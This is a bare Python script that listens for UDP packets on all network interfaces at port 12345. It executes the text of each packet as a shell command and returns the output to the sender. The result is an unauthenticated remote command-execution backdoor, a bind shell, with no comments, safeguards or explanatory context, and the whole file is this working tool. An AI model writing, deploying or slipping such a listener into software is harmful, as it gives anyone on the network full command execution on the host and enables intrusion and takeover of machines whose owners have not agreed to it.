import socket
import threading
import subprocess

server_ip = "0.0.0.0"
server_port = 12345

def handle_packet(data, address):
    try:
        command = data.decode("utf-8").strip()
        print(f"Received command from {address}: {command}")

        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        output = result.decode("utf-8").strip()
    except Exception as e:
        output = f"Error executing command: {e}"

    response_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    response_sock.sendto(output.encode(), address)
    response_sock.close()

def start_udp_listener():
  
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((server_ip, server_port))
    print(f"Listening for incoming UDP packets on {server_ip}:{server_port}")

    while True:
        data, address = sock.recvfrom(4096)
        threading.Thread(target=handle_packet, args=(data, address)).start()

start_udp_listener()
